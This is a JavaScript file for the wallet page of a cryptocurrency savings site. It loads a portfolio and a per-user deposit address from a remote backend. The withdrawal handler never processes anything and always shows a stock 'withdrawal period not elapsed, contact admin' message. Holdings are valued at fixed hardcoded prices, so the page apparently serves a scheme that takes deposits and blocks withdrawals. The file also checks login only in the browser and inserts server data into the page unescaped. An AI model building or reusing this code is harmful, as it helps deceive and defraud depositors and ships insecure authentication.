/* =========================
   AUTH CHECK
========================= */
if (!localStorage.getItem("loggedIn")) {
    window.location.href = "index.html";
}

async function checkForceLogout() {
    try {
        const res = await fetch("https://crypto-save-production.up.railway.app/auth/force-logout-status");
        const data = await res.json();

        const loginAt = Number(localStorage.getItem("loginAt")) || 0;

        if (data.forceLogoutAt && data.forceLogoutAt > loginAt) {
            localStorage.clear();
            window.location.href = "index.html";
        }
    } catch (err) {
        console.log("Force logout check failed:", err);
    }
}

checkForceLogout();
setInterval(checkForceLogout, 10000);

let currentTotal = 0;
let depositAddress = "";
let hidden = localStorage.getItem("hideBalance") === "true";

/* =========================
   INIT
========================= */
document.addEventListener("DOMContentLoaded", () => {
    const nav = document.getElementById("nav-wallet");
    if (nav) nav.classList.add("nav-active");

    loadWallet();
    setupHamburger();
    setupToggleBalance();
});

/* =========================
   WALLET DATA
========================= */
async function loadWallet() {
    try {
        const username = localStorage.getItem("user");
        if (!username) return;

        const res = await fetch(`https://crypto-save-production.up.railway.app/portfolio/${encodeURIComponent(username)}`);
        const data = await res.json();

        const assetsDiv = document.getElementById("walletAssets");
        const countEl = document.getElementById("assetCount");

        if (!assetsDiv) return;

        assetsDiv.innerHTML = "";

        let total = 0;
        let count = 0;

        const prices = {
            bitcoin: 65000,
            ethereum: 3500,
            usdt: 1,
            solana: 150
        };

        const logos = {
            bitcoin: "https://assets.coingecko.com/coins/images/1/large/bitcoin.png",
            ethereum: "https://assets.coingecko.com/coins/images/279/large/ethereum.png",
            usdt: "https://assets.coingecko.com/coins/images/325/large/Tether.png",
            solana: "https://assets.coingecko.com/coins/images/4128/large/solana.png"
        };

        if (data.assets) {
            Object.keys(data.assets).forEach(key => {
                const amount = Number(data.assets[key]) || 0;
                if (amount <= 0) return;

                const value = amount * (prices[key] || 1);

                total += value;
                count++;

                const el = document.createElement("div");
                el.className = "wallet-row";

                el.innerHTML = `
                    <div class="wallet-left">
                        <img src="${logos[key] || ''}" onerror="this.style.display='none'"/>
                        <div>
                            <h4>${key.toUpperCase()}</h4>
                            <small>${amount}</small>
                        </div>
                    </div>
                    <div class="wallet-right">
                        <strong>$${value.toFixed(2)}</strong>
                    </div>
                `;

                assetsDiv.appendChild(el);
            });
        }

        currentTotal = total;
        updateBalanceUI();

        if (countEl) countEl.innerText = count;

    } catch (err) {
        console.log("Wallet error:", err);
    }
}

/* =========================
   LOAD DEPOSIT ADDRESS (FIXED)
========================= */
async function loadDepositAddress() {
    try {
        const username = localStorage.getItem("user");
        if (!username) return;

        const res = await fetch(`https://crypto-save-production.up.railway.app/api/deposit-address/${encodeURIComponent(username)}`);

        const data = await res.json();

        depositAddress = data.address || "";

        const el = document.getElementById("depositWalletAddress");

        if (el) {
            el.value = depositAddress || "No address set";
        }

    } catch (err) {
        console.log("Deposit error:", err);
    }
}

/* =========================
   COPY ADDRESS
========================= */
function copyDepositAddress() {
    if (!depositAddress) {
        showToast("No address available");
        return;
    }

    navigator.clipboard.writeText(depositAddress);
    showToast("Address copied");
}

/* =========================
   BALANCE UI
========================= */
function updateBalanceUI() {
    const totalEl = document.getElementById("walletTotal");
    const eyeOpen = document.getElementById("eyeOpen");
    const eyeClosed = document.getElementById("eyeClosed");

    if (!totalEl) return;

    if (hidden) {
        totalEl.innerText = "****";
        if (eyeOpen) eyeOpen.style.display = "none";
        if (eyeClosed) eyeClosed.style.display = "inline";
    } else {
        totalEl.innerText = "$" + currentTotal.toFixed(2);
        if (eyeOpen) eyeOpen.style.display = "inline";
        if (eyeClosed) eyeClosed.style.display = "none";
    }
}

/* =========================
   TOGGLE BALANCE
========================= */
function setupToggleBalance() {
    const toggleBtn = document.getElementById("toggleBalance");

    if (!toggleBtn) return;

    toggleBtn.addEventListener("click", () => {
        hidden = !hidden;
        localStorage.setItem("hideBalance", hidden);
        updateBalanceUI();
    });
}

/* =========================
   HAMBURGER
========================= */
function setupHamburger() {
    const hamburger = document.getElementById("hamburger");
    const navLinks = document.getElementById("navLinks");
    const backdrop = document.getElementById("navBackdrop");

    if (!hamburger || !navLinks) return;

    function closeMenu() {
        navLinks.classList.remove("active");
        hamburger.classList.remove("open");
        if (backdrop) backdrop.classList.remove("active");
    }

    function toggleMenu() {
        const isOpen = navLinks.classList.toggle("active");
        hamburger.classList.toggle("open", isOpen);
        if (backdrop) backdrop.classList.toggle("active", isOpen);
    }

    hamburger.addEventListener("click", toggleMenu);
    if (backdrop) backdrop.addEventListener("click", closeMenu);

    navLinks.querySelectorAll(".nav-link").forEach(link => {
        link.addEventListener("click", closeMenu);
    });

    document.addEventListener("keydown", (e) => {
        if (e.key === "Escape") closeMenu();
    });
}

/* =========================
   MODALS
========================= */
function openDeposit() {
    document.getElementById("depositModal").style.display = "flex";
    loadDepositAddress(); // 🔥 LOAD HERE
}

function closeDeposit() {
    document.getElementById("depositModal").style.display = "none";
}

function openWithdraw() {
    document.getElementById("withdrawModal").style.display = "flex";
}

function closeWithdraw() {
    document.getElementById("withdrawModal").style.display = "none";
}

/* =========================
   WITHDRAW MESSAGE
========================= */
function submitWithdraw() {
    showToast("Withdrawal period not elapsed, contact admin");
    closeWithdraw();
}

/* =========================
   TOAST
========================= */
function showToast(message) {
    const toast = document.createElement("div");
    toast.className = "toast";
    toast.innerText = message;

    document.body.appendChild(toast);

    setTimeout(() => toast.classList.add("show"), 100);

    setTimeout(() => {
        toast.classList.remove("show");
        setTimeout(() => toast.remove(), 300);
    }, 2000);
}

/* =========================
   LOGOUT
========================= */
function logout() {
    localStorage.removeItem("user");
    localStorage.removeItem("loggedIn");
    localStorage.removeItem("hideBalance");
    window.location.href = "index.html";
}